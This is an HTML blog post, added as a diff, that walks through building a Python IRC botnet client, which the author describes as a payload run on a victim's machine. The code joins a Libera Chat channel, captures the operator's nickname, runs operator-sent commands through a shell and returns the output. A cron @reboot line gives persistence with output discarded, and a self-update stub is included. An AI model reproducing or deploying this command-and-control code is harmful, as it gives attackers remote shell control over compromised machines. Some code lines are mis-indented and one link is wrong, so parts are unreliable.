@@ -1,0 +1,805 @@
+<!doctype html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<title>Dissecting the Anatomy of a Botnet</title>
+		<meta name="description" content="A walkthrough of a Python-based IRC botnet prototype, covering the IRC protocol, command handling, and bot–operator communication.">
+		<link rel="icon" href="/blog/blg/favicon.ico">
+		<link rel="alternate" href="/blog/feed/feed.xml" type="application/atom+xml" title="Syswraith&#39;s Holocron 🔮">
+		<link rel="alternate" href="/blog/index.xml" type="application/rss+xml" title="Syswraith&#39;s Holocron 🔮">
+	<meta property="og:site_name" content="Syswraith&#39;s Holocron 🔮">
+	<meta property="og:title" content="Dissecting the Anatomy of a Botnet">
+	<meta property="og:description" content="A walkthrough of a Python-based IRC botnet prototype, covering the IRC protocol, command handling, and bot–operator communication.">
+	
+	<meta property="og:type" content="article">
+	<meta property="og:url" content="https://syswraith.github.io/blog/blogs/dissecting-the-anatomy-of-a-botnet/">
+	<meta property="og:image" content="https://syswraith.github.io/blog/og-image.svg">
+	<meta name="twitter:card" content="summary_large_image">
+	<meta name="twitter:title" content="Dissecting the Anatomy of a Botnet">
+	<meta name="twitter:description" content="A walkthrough of a Python-based IRC botnet prototype, covering the IRC protocol, command handling, and bot–operator communication.">
+	<meta name="twitter:image" content="https://syswraith.github.io/blog/og-image.svg">
+		
+		
+		
+		
+		<style>/* This is an arbitrary CSS string added to the bundle */
+/* Defaults */
+:root {
+	--font-family: "JetBrains Mono", ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+	--font-family-monospace: "JetBrains Mono", ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+}
+
+/* Theme colors: gruvbox material soft dark */
+:root {
+	color-scheme: dark;
+
+	--color-bg-0: #32302f;
+	--color-bg-1: #3c3836;
+	--color-bg-2: #504945;
+	--color-gray-20: #504945;
+	--color-gray-50: #a89984;
+	--color-gray-90: #ebdbb2;
+
+	--color-green: #b8bb26;
+	--color-yellow: #fabd2f;
+	--color-blue: #83a598;
+	--color-purple: #d3869b;
+	--color-aqua: #8ec07c;
+	--color-red: #fb4934;
+
+	--background-color: var(--color-bg-0);
+
+	--text-color: var(--color-gray-90);
+	--color-link: #6cc5b3;
+	--color-link-visited: #c76b99;
+	--text-color-link: var(--color-link);
+	--text-color-link-active: var(--color-yellow);
+	--text-color-link-visited: var(--color-link-visited);
+
+	--syntax-tab-size: 2;
+}
+
+::selection {
+	background: var(--color-bg-2);
+}
+
+
+/* Global stylesheet */
+* {
+	box-sizing: border-box;
+}
+
+@view-transition {
+	navigation: auto;
+}
+
+html,
+body {
+	padding: 0;
+	margin: 0 auto;
+	font-family: var(--font-family);
+	color: var(--text-color);
+	background-color: var(--background-color);
+}
+html {
+	overflow-y: scroll;
+}
+body {
+	max-width: 40em;
+}
+
+/* https://www.a11yproject.com/posts/how-to-hide-content/ */
+.visually-hidden:not(:focus):not(:active) {
+	clip: rect(0 0 0 0);
+	clip-path: inset(50%);
+	height: 1px;
+	overflow: hidden;
+	position: absolute;
+	white-space: nowrap;
+	width: 1px;
+}
+
+/* Fluid images via https://www.zachleat.com/web/fluid-images/ */
+img{
+  display: block;
+  max-width: 100%;
+  margin: 1.5rem auto;
+  border-radius: 5px;
+}
+img[width][height] {
+  height: auto;
+}
+img[src$=".svg"] {
+  width: 100%;
+  height: auto;
+  max-width: none;
+}
+video,
+iframe {
+	width: 100%;
+	height: auto;
+}
+iframe {
+	aspect-ratio: 16/9;
+}
+
+p:last-child {
+	margin-bottom: 0;
+}
+p {
+	line-height: 1.5;
+}
+
+li {
+	line-height: 1.5;
+}
+
+a[href] {
+	color: var(--text-color-link);
+}
+a[href]:visited {
+	color: var(--text-color-link-visited);
+}
+a[href]:hover,
+a[href]:active {
+	color: var(--text-color-link-active);
+}
+
+main,
+footer {
+	padding: 1rem;
+}
+main :first-child {
+	margin-top: 0;
+}
+
+header {
+	border-bottom: 1px dashed var(--color-gray-20);
+}
+
+footer {
+	border-top: 1px dashed var(--color-gray-20);
+}
+
+#skip-link {
+	text-decoration: none;
+	background: var(--background-color);
+	color: var(--text-color);
+	padding: 0.5rem 1rem;
+	border: 1px solid var(--color-gray-90);
+	border-radius: 2px;
+}
+
+/* Prevent visually-hidden skip link fom pushing content around when focused */
+#skip-link.visually-hidden:focus {
+	position: absolute;
+	top: 1rem;
+	left: 1rem;
+	/* Ensure it is positioned on top of everything else when it is shown */
+	z-index: 999;
+}
+
+.links-nextprev {
+	display: flex;
+	justify-content: space-between;
+	gap: .5em 1em;
+	list-style: "";
+	border-top: 1px dashed var(--color-gray-20);
+	padding: 1em 0;
+}
+.links-nextprev > * {
+	flex-grow: 1;
+}
+.links-nextprev-next {
+	text-align: right;
+}
+
+table {
+	margin: 1em 0;
+}
+table td,
+table th {
+	padding-right: 1em;
+}
+
+pre,
+code {
+	font-family: var(--font-family-monospace);
+}
+pre:not([class*="language-"]) {
+	margin: .5em 0;
+	line-height: 1.375; /* 22px /16 */
+	-moz-tab-size: var(--syntax-tab-size);
+	-o-tab-size: var(--syntax-tab-size);
+	tab-size: var(--syntax-tab-size);
+	-webkit-hyphens: none;
+	-ms-hyphens: none;
+	hyphens: none;
+	direction: ltr;
+	text-align: left;
+	white-space: pre;
+	word-spacing: normal;
+	word-break: normal;
+	overflow-x: auto;
+}
+code {
+	word-break: break-all;
+}
+
+/* Header */
+header {
+	display: flex;
+	gap: 1em;
+	flex-wrap: wrap;
+	justify-content: space-between;
+	align-items: center;
+	padding: 1em;
+}
+.home-link {
+	flex-grow: 1;
+	font-size: 1em; /* 16px /16 */
+	font-weight: 700;
+}
+.home-link:link:not(:hover) {
+	text-decoration: none;
+}
+
+/* Nav */
+.nav {
+	display: flex;
+	gap: .5em 1em;
+	padding: 0;
+	margin: 0;
+	list-style: none;
+}
+.nav-item {
+	display: inline-block;
+}
+.nav-item a[href]:not(:hover) {
+	text-decoration: none;
+}
+.nav a[href][aria-current="page"] {
+	text-decoration: underline;
+}
+
+/* Posts list */
+.postlist {
+	counter-reset: start-from var(--postlist-index);
+	list-style: none;
+	padding: 0;
+	padding-left: 1.5rem;
+}
+.postlist-item {
+	display: flex;
+	flex-wrap: wrap;
+	align-items: baseline;
+	counter-increment: start-from -1;
+	margin-bottom: 1em;
+}
+.postlist-item:before {
+	display: inline-block;
+	pointer-events: none;
+	content: "" counter(start-from, decimal-leading-zero) ". ";
+	line-height: 100%;
+	text-align: right;
+	margin-left: -1.5rem;
+}
+.postlist-date,
+.postlist-item:before {
+	font-size: 0.8125em; /* 13px /16 */
+	color: var(--color-gray-50);
+}
+.postlist-date {
+	word-spacing: -0.5px;
+}
+.postlist-link {
+	font-size: 1.1875em; /* 19px /16 */
+	font-weight: 700;
+	flex-basis: calc(100% - 1.5rem);
+	padding-left: .25em;
+	padding-right: .5em;
+	text-underline-position: from-font;
+	text-underline-offset: 0;
+	text-decoration-thickness: 1px;
+}
+.postlist-item-active .postlist-link {
+	font-weight: bold;
+}
+
+/* Tags */
+.post-tag {
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	text-transform: capitalize;
+	font-style: italic;
+}
+.postlist-item > .post-tag {
+	align-self: center;
+}
+
+/* Tags list */
+.post-metadata {
+	padding: 0;
+	margin: 0;
+}
+.post-tags {
+	margin: .25em 0 0;
+}
+
+
+/* Gruvbox dark soft: content details */
+h1,
+h2,
+h3,
+h4,
+h5,
+h6 {
+	line-height: 1.25;
+}
+
+/* Heading text doubles as the deeplink (no “#” glyph) */
+a.heading-link {
+	color: inherit;
+	text-decoration: none;
+}
+:is(h1, h2, h3, h4, h5, h6):hover a.heading-link {
+	text-decoration: underline;
+	text-underline-offset: 0.15em;
+}
+
+h1 {
+	color: var(--color-yellow);
+	margin-bottom: 0.25em;
+}
+h2 {
+	color: var(--color-green);
+}
+h3 {
+	color: var(--color-aqua);
+}
+h4 {
+	color: var(--color-blue);
+}
+h5 {
+	color: var(--color-purple);
+}
+h6 {
+	color: var(--color-gray-50);
+}
+
+blockquote {
+	margin: 1em 0;
+	padding: 0.25em 0 0.25em 1em;
+	border-left: 0.25em solid var(--color-green);
+	color: var(--color-gray-50);
+}
+
+hr {
+	border: 0;
+	border-top: 1px dashed var(--color-gray-20);
+	margin: 1.5em 0;
+}
+
+table {
+	border-collapse: collapse;
+}
+th,
+td {
+	border: 1px solid var(--color-gray-20);
+}
+th {
+	background: var(--color-bg-1);
+	font-weight: 700;
+}
+td,
+th {
+	padding: 0.35em 0.75em;
+}
+
+pre:not([class*="language-"]) {
+	background: var(--color-bg-1);
+	color: var(--color-gray-90);
+	padding: 0.75em 1em;
+	border: 1px solid var(--color-gray-20);
+	border-radius: 2px;
+}
+
+code {
+	background: var(--color-bg-1);
+	border-radius: 2px;
+	padding: 0.1em 0.3em;
+}
+pre code {
+	background: none;
+	padding: 0;
+}
+
+a[href]:not([class]) {
+	text-decoration: underline;
+	text-underline-offset: 2px;
+	text-decoration-thickness: 1px;
+}
+
+progress {
+ accent-color: var(--color-green);
+}
+
+input[type="checkbox"] {
+ accent-color: var(--color-green);
+}
+
+/* Obsidian-style wikilinks */
+a.wikilink {
+	text-decoration: underline;
+	text-decoration-style: dotted;
+	text-underline-offset: 2px;
+}
+.wikilink-missing {
+	color: var(--color-red);
+	text-decoration: underline dotted;
+	text-underline-offset: 2px;
+}
+
+/* Section index lists */.section-list {
+	list-style: none;
+	padding: 0;
+	margin: 1em 0;
+}
+.section-list-item {
+	display: flex;
+	flex-wrap: wrap;
+	align-items: baseline;
+	gap: 0.75em;
+	margin-bottom: 0.6em;
+	line-height: 1.4;
+}
+.section-list-link {
+	font-weight: 700;
+	font-size: 1.0625em; /* 17px */
+	text-underline-offset: 2px;
+}
+.section-list-item time {
+	font-size: 0.8125em;
+	color: var(--color-gray-50);
+}
+
+/* YouTube embeds */
+.youtube-embed {
+	display: block;
+	width: 100%;
+	aspect-ratio: 16 / 9;
+	border: 0;
+	border-radius: 2px;
+}
+
+/* Footer socials */
+.footer-socials {
+	display: flex;
+	flex-wrap: wrap;
+	gap: 0.25em 1.25em;
+	list-style: none;
+	padding: 0;
+	margin: 0 0 0.5em;
+}
+.footer-socials a {
+	text-underline-offset: 2px;
+}
+/* gruvbox bright for Prism */
+code[class*="language-"],
+pre[class*="language-"] {
+	color: #ebdbb2;
+	background: #3c3836;
+	text-shadow: none;
+	direction: ltr;
+	text-align: left;
+	white-space: pre;
+	word-spacing: normal;
+	word-break: normal;
+	tab-size: 2;
+	hyphens: none;
+}
+
+pre[class*="language-"] {
+	overflow: auto;
+	padding: 0.75em 1em;
+	margin: 0.5em 0;
+	border: 1px solid #504945;
+	border-radius: 2px;
+	line-height: 1.4;
+}
+
+:not(pre) > code[class*="language-"] {
+	padding: 0.1em 0.3em;
+	border-radius: 2px;
+	white-space: normal;
+}
+
+.token.comment,
+.token.prolog,
+.token.doctype,
+.token.cdata {
+	color: #928374;
+	font-style: italic;
+}
+
+.token.punctuation {
+	color: #a89984;
+}
+
+.token.namespace {
+	opacity: 0.7;
+}
+
+.token.property,
+.token.tag,
+.token.constant,
+.token.symbol,
+.token.deleted {
+	color: #fb4934;
+}
+
+.token.boolean,
+.token.number {
+	color: #d3869b;
+}
+
+.token.selector,
+.token.attr-name,
+.token.string,
+.token.char,
+.token.builtin,
+.token.inserted {
+	color: #b8bb26;
+}
+
+.token.operator,
+.token.entity,
+.token.url,
+.language-css .token.string,
+.style .token.string {
+	color: #fe8019;
+	background: transparent;
+}
+
+.token.atrule,
+.token.attr-value,
+.token.keyword {
+	color: #fabd2f;
+}
+
+.token.function,
+.token.class-name {
+	color: #8ec07c;
+}
+
+.token.regex,
+.token.important,
+.token.variable {
+	color: #fe8019;
+}
+
+.token.important,
+.token.bold {
+	font-weight: bold;
+}
+
+.token.italic {
+	font-style: italic;
+}
+
+.entity {
+	cursor: help;
+}</style>
+		<link rel="preconnect" href="https://fonts.googleapis.com">
+		<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+		<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+		
+	</head>
+	<body>
+		<a href="#main" id="skip-link" class="visually-hidden">Skip to main content</a>
+
+		<header>
+			<a href="/blog/" class="home-link">Syswraith&#39;s Holocron 🔮</a>
+			<nav>
+				<h2 class="visually-hidden" id="top-level-navigation-menu">Top level navigation menu</h2>
+				<ul class="nav">
+					<li class="nav-item"><a href="/blog/">Home</a></li>
+					<li class="nav-item"><a href="/blog/archive/">Archive</a></li>
+					<li class="nav-item"><a href="/blog/tags/">Tags</a></li>
+					<li class="nav-item"><a href="/blog/feed/feed.xml">Feed</a></li>
+				</ul>
+			</nav>
+		</header>
+
+<main id="main">
+		<heading-anchors content="">
+			<h1 id="dissecting-the-anatomy-of-a-botnet">Dissecting the Anatomy of a Botnet</h1>
+<p class="post-metadata"><time datetime="2025-01-17">17 January 2025</time></p>
+<p class="post-tags">Tags:
+	<a href="/blog/tags/irc/" class="post-tag">irc</a>
+	<a href="/blog/tags/botnet/" class="post-tag">botnet</a>
+	<a href="/blog/tags/python/" class="post-tag">python</a>
+	<a href="/blog/tags/networking/" class="post-tag">networking</a>
+	<a href="/blog/tags/sockets/" class="post-tag">sockets</a>
+	<a href="/blog/tags/security/" class="post-tag">security</a>
+	<a href="/blog/tags/malware-analysis/" class="post-tag">malware-analysis</a>
+	<a href="/blog/tags/automation/" class="post-tag">automation</a>
+</p>
+
+<h2 id="tl-dr">TL;DR</h2>
+<ul>
+<li><a href="https://github.com/syswraith/ngzl">The script</a></li>
+<li>Python script that uses the IRC protocol to issue commands to the bots and send back output to the bot herder.</li>
+<li>If extended, can include functionality such as:
+<ul class="contains-task-list">
+<li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> Daemonizing with <code>cron</code></li>
+<li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> Auto-update</li>
+<li class="task-list-item"><input class="task-list-item-checkbox" disabled="" type="checkbox"> Auto-corrupt</li>
+</ul>
+</li>
+</ul>
+<h2 id="words-of-caution">Words of caution</h2>
+<ul>
+<li>Using this script for nefarious purposes is strictly prohibited and I will not be responsible for any damages that may be caused.</li>
+<li>This script was authored by me for the purpose of learning more about Python libraries, mainly <code>os</code>, <code>socket</code> and <code>subprocess</code>. It does not follow the best practices or conventions. It's just a really basic prototype.</li>
+</ul>
+<h1 id="about-the-irc-protocol">About the IRC protocol</h1>
+<blockquote>
+<p>The IRC protocol was developed over the last 4 years since it was first implemented as a means for users on a BBS to chat amongst themselves. Now it supports a world-wide network of servers and clients, and is stringing to cope with growth.</p>
+<p>Over the past 2 years, the average number of users connected to the main IRC network has grown by a factor of 10.</p>
+<p>The IRC protocol is a text-based protocol, with the simplest client being any socket program capable of connecting to the server.</p>
+<p>~ <em>Abstract, RFC 1459</em></p>
+</blockquote>
+<ul>
+<li>IRC is a TCP-based protocol that supports multi-user communication in real time.</li>
+<li>It was created in 1988 by Jarkko &quot;WiZ&quot; Oikarinen at the University of Oulu in Finland, to extend his BBS software.</li>
+<li>Anything that connected to the IRC server is termed as a client.</li>
+<li>The protocol was then formalized in RFC 1459 when the specification was laid out for the general public.</li>
+<li>IRC is insecure by default- all communications are made using plaintext and are unencrypted.</li>
+<li>Some of the popular IRC servers operating today are <a href="https://libera.chat">Libera Chat</a>, <a href="https://freenode.net/">Freenode</a>, <a href="https://www.ircnet.com/">IRCnet</a>, etc.</li>
+</ul>
+<pre><code>                           [ Server 15 ]  [ Server 13 ] [ Server 14]
+                                 /                \         /
+                                /                  \       /
+        [ Server 11 ] ------ [ Server 1 ]       [ Server 12]
+                              /        \          /
+                             /          \        /
+                  [ Server 2 ]          [ Server 3 ]
+                    /       \                      \
+                   /         \                      \
+           [ Server 4 ]    [ Server 5 ]         [ Server 6 ]
+            /    |    \                           /
+           /     |     \                         /
+          /      |      \____                   /
+         /       |           \                 /
+ [ Server 7 ] [ Server 8 ] [ Server 9 ]   [ Server 10 ]
+
+                                  :
+                               [ etc. ]
+                                  :
+
+                 [ Format of IRC server network ]
+</code></pre>
+<h1 id="about-botnets">About Botnets</h1>
+<ul>
+<li>A botnet is a group of devices, which can be used to perform malicious activities such as distributed denial of service attacks, steal personal information, send spam and allow the attacker to access and utilise the device's network and resources.</li>
+<li>Malware infecting a machine through various means (phishing emails, malicious websites, vulnerable software) is the main cause of creation of a botnet. Malware turns devices into &quot;zombies&quot; or &quot;bots&quot; that are under the attackers command.</li>
+<li>Botnets have traditionally followed the client-server architecture, but nowadays we see the rise of peer-to-peer type networks as well.</li>
+<li>Known botnets include the <a href="https://en.wikipedia.org/wiki/Carna_botnet">Carna Botnet</a>, <a href="https://en.wikipedia.org/wiki/Zeus_(malware)">ZeuS</a>, <a href="https://en.wikipedia.org/wiki/Carna_botnet">Mirai</a>, etc.</li>
+</ul>
+<h1 id="creating-a-botnet-script">Creating a botnet script</h1>
+<p>The program that we will work on is a payload that will execute on a victim's machine, and turn it into a &quot;bot&quot;. The code is available at <a href="https://github.com/syswraith/ngzl">syswraith/ngzl</a> under the MIT license.
+This is its directory structure:</p>
+<pre><code>.
+├── init.sh
+├── ngzl.py
+└── README.md
+
+1 directory, 3 files
+</code></pre>
+<p>Files of importance are:</p>
+<ul>
+<li><code>init.sh</code> this script calls ngzl.py. It was added so that the botnet script can update itself more easily. More on this later.</li>
+<li><code>ngzl.py</code> this is the main script that turns the device into a bot. This script is assumed to be executed with <strong>superuser</strong> priviledges.</li>
+</ul>
+<h2 id="steps">Steps</h2>
+<ol>
+<li>First, we will decide what service we're going to use. I am familiar with Libera Chat. Following are the configuration options that I have decided on.</li>
+</ol>
+<pre class="language-python" tabindex="0"><code class="language-python">server <span class="token operator">=</span> <span class="token string">"irc.libera.chat"</span>
+port <span class="token operator">=</span> <span class="token number">6667</span>
+channel <span class="token operator">=</span> <span class="token string">"#feycomm"</span>
+nick <span class="token operator">=</span> os<span class="token punctuation">.</span>uname<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"09"</span></code></pre>
+<ol start="2">
+<li>We define a function named <code>connect_routine</code> with the above configurations as parameters. In this function, we create a basic TCP socket and connect to the server and port.</li>
+</ol>
+<pre class="language-python" tabindex="0"><code class="language-python">irc <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
+irc<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>server<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+<ol start="3">
+<li>We also send the respective commands to set the nickname and join the channel that we decided on before. Note that these commands need to be encoded as <strong>bytes</strong> and NOT as normal strings.</li>
+</ol>
+<pre class="language-python" tabindex="0"><code class="language-python">irc<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"NICK </span><span class="token interpolation"><span class="token punctuation">{</span>nick<span class="token punctuation">}</span></span><span class="token string">\r\n"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+irc<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"USER </span><span class="token interpolation"><span class="token punctuation">{</span>nick<span class="token punctuation">}</span></span><span class="token string"> 0 * :</span><span class="token interpolation"><span class="token punctuation">{</span>nick<span class="token punctuation">}</span></span><span class="token string">\r\n"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+irc<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"JOIN </span><span class="token interpolation"><span class="token punctuation">{</span>channel<span class="token punctuation">}</span></span><span class="token string">\r\n"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+irc<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"PRIVMSG </span><span class="token interpolation"><span class="token punctuation">{</span>channel<span class="token punctuation">}</span></span><span class="token string"> :</span><span class="token interpolation"><span class="token punctuation">{</span>nick<span class="token punctuation">}</span></span><span class="token string"> has connected. Awaiting username capture.\r\n"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+<ol start="4">
+<li>Now we need to listen for broadcasted messages. Since we don't know how long we'll be listening for, we will use a infinite <code>while</code> loop to listen continuously.</li>
+<li>Since we don't need to read the whole response, we will only read 2048 bytes into it.</li>
+</ol>
+<pre class="language-python" tabindex="0"><code class="language-python"><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+    response <span class="token operator">=</span> irc<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<ol start="6">
+<li>Now to the crux of the program. There are three main features that I'm going to implement- the ability of the bot to respond to PINGS, the ability of the bot to record the username of the bot operator, and the ability to execute the commands issued by the bot operator. The second feature is vital for the third to work.</li>
+</ol>
+<p><img src="/blog/blogs/dissecting-the-anatomy-of-a-botnet/ZQa1B8Yfay-640.webp" alt="Bot command-handling flow" loading="lazy" decoding="async" width="1104" height="616" srcset="/blog/blogs/dissecting-the-anatomy-of-a-botnet/ZQa1B8Yfay-640.webp 640w, /blog/blogs/dissecting-the-anatomy-of-a-botnet/ZQa1B8Yfay-1104.webp 1104w" sizes="auto"></p>
+<ol start="7">
+<li>The first one is simple enough, you just have to respond with <code>PONG</code> every time someone says <code>PING</code>, followed by the server name.</li>
+</ol>
+<pre class="language-python" tabindex="0"><code class="language-python"><span class="token keyword">if</span> response<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"PING"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    server_data <span class="token operator">=</span> response<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>  <span class="token comment"># Get everything after the ":"</span>
+    irc<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"PONG :</span><span class="token interpolation"><span class="token punctuation">{</span>server_data<span class="token punctuation">}</span></span><span class="token string">\r\n"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token triple-quoted-string string">"""
+this is for the following PING messages:
+PING :lead.libera.chat
+PING :iridium.libera.chat
+"""</span></code></pre>
+<ol start="9">
+<li>IRC messages follow a <em>pseudo BNF</em> format- they are prefixed with a <code>:</code> and are always suffixed with trailing <code>CR-LF</code> characters. A message from a user looks like this:
+<code>:Guest99!~Guest99@2402:e281:3d7e:4e:5e9:d2a2:e8ce:6b02 PRIVMSG #feycomm :hello</code>
+To get the username of the bot operator, we need to parse the response. Here, we note the positions of <code>:</code> and <code>!</code>, whatever string follows in between is the username.</li>
+</ol>
+<pre class="language-python" tabindex="0"><code class="language-python"><span class="token keyword">elif</span> <span class="token string">"IDENTIFY-9"</span> <span class="token keyword">in</span> response<span class="token punctuation">:</span>
+    startIndex <span class="token operator">=</span> response<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span>
+    endIndex <span class="token operator">=</span> response<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">"!"</span><span class="token punctuation">)</span>
+    username <span class="token operator">=</span> response<span class="token punctuation">[</span>startIndex<span class="token punctuation">:</span>endIndex<span class="token punctuation">]</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Username captured: `</span><span class="token interpolation"><span class="token punctuation">{</span>username<span class="token punctuation">}</span></span><span class="token string">`"</span></span><span class="token punctuation">)</span>
+    irc<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"PRIVMSG </span><span class="token interpolation"><span class="token punctuation">{</span>channel<span class="token punctuation">}</span></span><span class="token string"> :Username captured: </span><span class="token interpolation"><span class="token punctuation">{</span>username<span class="token punctuation">}</span></span><span class="token string">. Awaiting commands.\r\n"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+<ol start="10">
+<li>Next is the interesting part! We have recorded the username in the previous step so that we can send <code>PRIVMSGs</code> to the operator. It is intentionally designed because a single bot cannot send a flood of input (read: command output) to the IRC server (the server rate-limits you, I checked) and it cannot send too many messages too quickly. Therefore we <code>time.sleep()</code> our messages and send them to the bot operator directly instead of sending them in the channel, as to avoid confusion.</li>
+</ol>
+<pre class="language-python" tabindex="0"><code class="language-python"><span class="token keyword">elif</span> <span class="token string">"&lt;9>"</span> <span class="token keyword">in</span> response<span class="token punctuation">:</span>
+ command <span class="token operator">=</span> response<span class="token punctuation">[</span>response<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">"&lt;9> "</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Command issued: `</span><span class="token interpolation"><span class="token punctuation">{</span>command<span class="token punctuation">}</span></span><span class="token string">`"</span></span><span class="token punctuation">)</span>
+    result <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>command<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> capture_output<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+    resultxt <span class="token operator">=</span> result<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>splitlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span> x <span class="token keyword">in</span> resultxt<span class="token punctuation">:</span>
+     time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+        irc<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"PRIVMSG </span><span class="token interpolation"><span class="token punctuation">{</span>username<span class="token punctuation">}</span></span><span class="token string"> :</span><span class="token interpolation"><span class="token punctuation">{</span>x<span class="token punctuation">}</span></span><span class="token string">\r\n"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+</code></pre>
+<p>And that's it! That's the core functionality of the script.</p>
+<h3 id="miscellaneous">Miscellaneous</h3>
+<p>Here's a little update function that may aid in the updating of the <code>init.sh</code> script.</p>
+<pre class="language-python" tabindex="0"><code class="language-python"><span class="token keyword">def</span> <span class="token function">update_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"new_init.sh"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+        <span class="token comment"># logic to get new content here</span>
+        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"UPDATED CONTENT GOES HERE"</span><span class="token punctuation">)</span>
+    os<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"new_init.sh"</span><span class="token punctuation">,</span> <span class="token string">"init.sh"</span><span class="token punctuation">)</span></code></pre>
+<p>And here's the command to <em>daemonize</em> the script using <code>cron</code> and run it on startup. Output and errors are discarded.</p>
+<pre class="language-bash" tabindex="0"><code class="language-bash"><span class="token function">crontab</span> <span class="token parameter variable">-e</span>
+
+<span class="token comment"># Add the following line</span>
+@reboot <span class="token function">nohup</span> path-to-script/init.sh <span class="token operator">></span> /dev/null <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">&amp;</span> disown</code></pre>
+
+<ul class="links-nextprev"><li class="links-nextprev-next">Next →<br><a href="/blog/blogs/simplified-alerts--using-deepseek-r1-to-summarize-chats/">Simplified alerts — Using Deepseek-r1 to summarize chats</a></li>
+</ul>
+
+		</heading-anchors>
+	</main>
+
+		<footer>
+			<ul class="footer-socials">
+				<li><a href="https://github.com/syswraith/">GitHub</a></li>
+				<li><a href="https://www.youtube.com/@syswraith">YouTube</a></li>
+				<li><a href="https://x.com/syswraith">Twitter</a></li>
+				<li><a href="https://instagram.com/syswraith">Instagram</a></li>
+			</ul>
+			<p>© 2026 Syswraith</p>
+		</footer>
+
+		<!-- This page `/blogs/dissecting-the-anatomy-of-a-botnet/` was built on 2026-10-18T18:29:03.902Z -->
+		<script type="module" src="/blog/dist/VZzbzR9_xw.js"></script>
+		
+	</body>
+</html>
